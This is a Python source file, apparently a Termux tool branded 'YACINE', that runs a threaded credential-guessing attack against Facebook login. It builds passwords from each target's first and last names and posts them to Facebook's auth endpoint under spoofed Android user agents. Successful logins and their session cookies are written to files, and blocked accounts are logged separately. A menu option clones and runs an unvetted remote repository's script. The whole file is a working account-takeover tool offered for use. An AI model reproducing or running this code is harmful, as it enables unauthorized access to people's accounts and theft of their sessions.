#<<_________[ COLOR ]_________>>#
W = '\033[97;1m' 
B = '\033[96;1m'
P = '\033[95;1m' 
R = '\033[91;1m' 
G = '\033[92;1m'
#os.system("pip uninstall urllib3 requests chardet idna certifi -y;pip install urllib3 requests chardet idna certifi")
import os,time
os.system('clear')
try:
    import requests
    import marshal
    from string import *
    from bs4 import BeautifulSoup
    from bs4 import BeautifulSoup as sop
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
    os.system('pip install requests > /dev/null')
except:pass
import json,time,re,random,sys,uuid,string,subprocess,zlib,platform,base64
try:import arrow
except:os.system('pip install arrow');import arrow
try:import httplib2
except ModuleNotFoundError:
    try:
        with open(os.devnull, 'w') as null:
            subprocess.check_call(["pip", "install", " httplib2"], stdout=null, stderr=null)
            import httplib2
    except subprocess.CalledProcessError:
        print(f" Module Installing Failed")
        exit()

#─━─━─━─━[User Agent]━─━─━─━─━#
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()   

gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
    
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
#─━─━─━─━[UA METHOD]━─━─━─━─━#
def UA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_US;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2199};FB_FW/1;]"
    c = ";[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;]"
    d = ";[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/bg_BG;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G770F;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2163};FB_FW/1;]"
    e = ";[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/bg_BG;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G770F;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2163};FB_FW/1;]"
    f = ";[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/pt_PT;FBBV/548243055;FBCR/Unitel STP;FBMF/samsung;FBBD/samsung;FBDV/SM-A032F;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1459};FB_FW/1;]"
    g = ";[FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A525F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]"
    l = ";[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]"
    h = ";[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]"
    j = ";[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]"
    k = ";[FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]"
    ua = a+b+c+d+e+f+g+l+h+j+k
    return ua
    
#####_____Folder-Setup_____#####
try:
    os.makedirs('/sdcard/YACINE')
except:
    pass
sys.stdout.write('\x1b]2;YACINE\x07')
#<<_________[ LOGO ]_________>>#
logo =f"""\33[1;37m                                            
 _     _  _____  _    _  _  _   _  ___   
( )   ( )(  _  )( )  ( )(_)( ) ( )(  _`\ 
`\`\_/'/'| (_) |`\`\/'/'| || `\| || (_(_)
  `\ /'  |  _  |  >  <  | || , ` ||  _)_ 
   | |   | | | | /'/\`\ | || |`\ || (_( )
   (_)   (_) (_)(_)  (_)(_)(_) (_)(____/'
   
 \33[1;31m════════════════════════════V=0.1════════════
\33[1;31m[\33[1;31m🔻\33[1;31m]\33[1;31m DEVLOPER\33[1;33m 🔻\33[1;33m YACINE ER AMRANI X YACINE LIM
\33[1;31m[\33[1;31m🔻\33[1;31m]\33[1;31m FACEBOOK \33[1;33m🔻\33[1;33m YACINE ER AMRANI X YACINE LIM
\33[1;31m[\33[1;33m🔻\33[1;31m]\33[1;31m TIPE   \33[1;33m  🔻\33[1;33m PIDE\33[1;31m\33[1;31m
\33[1;31m[\33[1;31m🔻\33[1;31m]\33[1;31m GITHUB\33[1;33m   🔻\33[1;33m YACINE-XD
\33[1;37m══════════════════════════════════════════════"""
loop=0
oks=[]
cps=[]
cp=[]
pcp=[]
def line():
    print(f"\33[1;32m══════════════════════════════════════════════")
def clear():
    os.system(f'clear')
    print(logo)
#<<_________[ Main Menu ]_________>>#
def menu1():
    clear()            
    print(f"{R}[{G}1{R}] {G}File Cloning ")
    print(f"{R}[{G}2{R}] {G}File Crate")
    print(f"{R}[{G}3{R}] {G}Admin Contect") 
    print(f"{R}[{G}0{R}] {G}Exit")
    line()    
    xd=input(f'{R}[🔻{R}]{W} CHOSE: ')
    if xd in ['1','01']:
        clear()
        print(f'{R}[🔻{R}]{W} EXP:  {G}/sdcard/File.txt  etc..')
        line()
        file = input(f'{R}[🔻{R}] {G}PUT FILE\033[1;33m: ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(f'{R}[🔻{R}]{W} FILE NOT FOUND ')
            time.sleep(1)
            exit()
        clear()
        
        print(f'{R}[{G}1{R}] {G}METHOD 1  {R}[{G} XD {R}]')       
        line()
        mthd=input(f'{R}[🔻{R}]{W} CHOSE: ')
        line()
        plist = []
        clear()
        print(f'{R}[{G}1{R}]{G} Auto password ')       
        line()
        ppp=input(f'{R}[🔻{R}]{W} CHOSE: ')
        clear()
        if ppp in ['1','01']:
                plist.append('first last')
                plist.append('first first')
                plist.append('last first')
                plist.append('last last')
                plist.append('firstfirst')
                plist.append('firstlast')
                plist.append('lastlast')
                plist.append('lastfirst')
                plist.append('firstlast123')                
                plist.append('firstlast1234')                               
                plist.append('firstlast12345')
                plist.append('first12')
                plist.append('first 123')
                plist.append('first 1234')                            
                plist.append('first 12345')                                
                plist.append('first123')
                plist.append('first1234')
                plist.append('first12345')
                plist.append('first123456')
                plist.append('first123456789')
                
        else:
                try:
                    ps_limit = int(input(f'{R}[{R}🔻{R}]{G} PASS LIMIT : '))
                except:
                    ps_limit = 2
                clear()
                print(f'{R}[{R}🔻{R}] EXP: {G}first last,firtslast,first123')
                line()
                for i in range(ps_limit):
                        plist.append(input(f'{R}[{R}🔻{R}]{W} PUT PASS {i+1}: '))
        clear()
        print(f'{R}[{R}🔻{R}]{G} DO YOU WANT TO SHOW CP IDS ? (y/n): ')
        line()
        cx=input(f'{R}[{R}🔻{R}]{G} CHOSE: ')
        if cx in ['y','Y','yes','Yes','1']:
            pcp.append('y')
        else:
            pcp.append('n')
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(f'{R}[🔻{R}]{G} TOTAL IDS : {R} '+total_ids+f'{W}  {G}METHOD :{R} 1 ')               
            print(f'{R}[🔻{R}]{G} TRUN {G}[{G}ON{G}/{R}OFF{G}] {G}MODE AVION AVRY 2 MINIT ')
            line()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:              
                    crack_submit.submit(ffb3,ids,names,passlist)
        print(f'\033[1;33m')
        line()
        print(f'{R}[🔻{R}]{W} PROCESS COMPLTED')
        print(f"{R}[🔻{R}]{W} {W} OK IDZ : {G}%s "%(len(oks)))
        print(f"{R}[🔻{R}]{W} {W} CP IDZ : {R}%s "%(len(cps)))
        line()
        input(f'{R}[🔻{R}]{W} PRESS ENTER TO BACK ')
        exit()
    elif xd in ['2','02']:
        Create_exit()
    elif xd in ['3','03']:
        ipMain()
    elif xd in ['0','00']:
        exit(f'{R}[🔻{R}]{W} Thanks For Use ')
    else:
        exit(f'{R}[🔻{R}]{W} Option not found in menu...')
        
#------------METHOD------------#   
     
def ffb3(ids,names,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f'\r\r{R}[{G}YACINE{R}]{W}-{R}[{B}%s{R}]{W}-{R}[{G}OK:%s{R}]{W}-{R}[\33[1;32mCP:%s{R}] {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            data={"adid": adid,
'method': 'POST',
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'cpl': 'true',
'credentials_type': 'password',
'generate_session_cookies': '1',
'error_detail_type': 'button_with_disabled',
'generate_machine_id': '1',
'locale': 'en_US',
'client_country_code': 'US',
'omit_response_on_success': 'false',
'enroll_misauth': 'false',
'advertising_id': str(uuid.uuid4()),
'encrypted_msisdn': '',
'fb_api_req_friendly_name': 'authenticate'}
            headers = {'Host': 'graph.facebook.com',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'x-fb-connection-bandwidth': '29920503', 
'x-fb-net-hni': '34528', 
'x-fb-sim-hni': '38333', 
'Zero-Rated': '0', 
'x-fb-connection-quality': 'EXCELLENT', 
'x-fb-connection-type': 'MOBILE.LTE', 
'user-agent': UA(), 
'content-type': 'app_authlication/x-www-form-urlencoded',
'x-fb-http-engine': 'Liger',
'x-fb-client-IP': 'True',
'x-fb-server-cluster': 'Keep-Alive',
'Content-Type': 'application/json'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r{R}[{G}YACINE-❤️️{R}]{G} '+ids+' ◽ '+pas+'\033[1;97m')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                #print(f' COOKIES: \033[1;32m'+cookies)
                open('/sdcard/YACINE/YACINE-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                open('/sdcard/YACINE/YACINE-OK.txt','a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                okid(ids,pas,cookies)
                break
            elif 'www.facebook.com' in po['error']['message']:
                
                    #print(f'\r\r{R} [YACINE-CP] '+ids+' ◽ '+pas+'\033[1;97m')
                    open('/sdcard/YACINE/YACINE-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        time.sleep(20)
#--------------Create---------------#        
def Create_exit():
    clear()
    print(f'{W}[{R}2{W}] {W}CREATE FILE BY HANNAN TOOL ')
    print(f'{W}[{R}0{W}] {W}BACK MAIN MENU ')
    line()
    option=input(f'{R}[🔻{R}]{W} {W}CHOICE MENU >> ')
    
    if option in ['1','02']:
        Create_M2()
    if option in ['0','00']:
        exit()
    else:
        line()
    print(f'{R}[{R}🔻{R}] {R} SELECTED WRONG OPTION')
    time.sleep(2)
    Create_exit()

def Create_M2():
        os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
        os.system('cd && cd FILE ;python FILE.py')

menu1()